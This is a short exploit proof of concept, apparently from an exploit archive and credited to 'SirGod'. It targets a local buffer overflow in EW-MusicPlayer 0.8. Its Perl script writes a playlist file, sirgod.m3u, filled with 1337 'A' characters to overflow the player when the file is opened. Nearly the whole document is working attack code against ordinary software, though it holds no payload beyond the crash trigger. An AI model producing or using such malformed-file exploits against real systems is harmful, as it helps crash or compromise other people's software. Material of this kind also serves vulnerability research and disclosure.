#####################################################################################################
#                    EW-MusicPlayer0.8 (.M3U File) Local Buffer Overflow PoC
#                 Discovered by SirGod  -  www.mortal-team.net & www.h4cky0u.org
#         Download : http://www.brothersoft.com/ew-musicplayer-download-97163.html
######################################################################################################
my $chars= "A" x 1337;
my $file="sirgod.m3u";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file was created";
print "SirGod - www.mortal-team.net & www.h4cky0u.org";